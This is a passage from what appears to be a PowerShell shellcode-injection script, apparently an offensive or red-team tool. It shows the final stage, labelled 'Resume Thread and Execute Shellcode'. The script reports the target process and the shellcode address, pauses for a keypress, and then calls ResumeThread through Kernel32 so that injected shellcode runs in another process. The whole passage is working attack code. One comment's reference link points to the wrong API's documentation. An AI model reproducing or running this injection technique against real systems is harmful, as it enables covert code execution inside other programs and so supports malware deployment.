        Write-Host 'Attach to the ' -NoNewline ; Write-Host "'$($TargetProcess.ProcessName)' ($($TargetProcess.Id))" -ForegroundColor Green -NoNewline ; Write-Host ' instance.'
        Write-Host ' o  --> Shellcode located at address : ' -NoNewline ; Write-Host $(Print-Hex $ShellcodeAddr) -ForegroundColor Green
        Write-Host ' o  --> ' -NoNewline ; Write-Host 'PRESS ENTER TO EXECUTE SHELLCODE.' -ForegroundColor Red -NoNewline
        $NULL = Read-Host
    }


    ### (6) Resume Thread and Execute Shellcode ###

    Write-Host "[!] Resuming process execution..." -ForegroundColor Yellow

    # ResumeThread()
    #  > Description : Decrement a thread's suspend count; if decremented to zero the thread resumes.
    #  > Location    : Kernel32.dll
    #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

    # Argument(s)
    $hThread = $RetProcessInformation.hThread  # Handle to the target thread.

    Write-Host ' o  ' -NoNewline ; Write-Host 'ResumeThread()' -ForegroundColor Green

    Try   { $Success = $ResumeThread.Invoke($hThread) }
    Catch { return Generic-Error }

    if ($Success -ne 1) { return Win32-Error }     
    Write-Host " o  --> Thread Handle : ${hThread}"
}
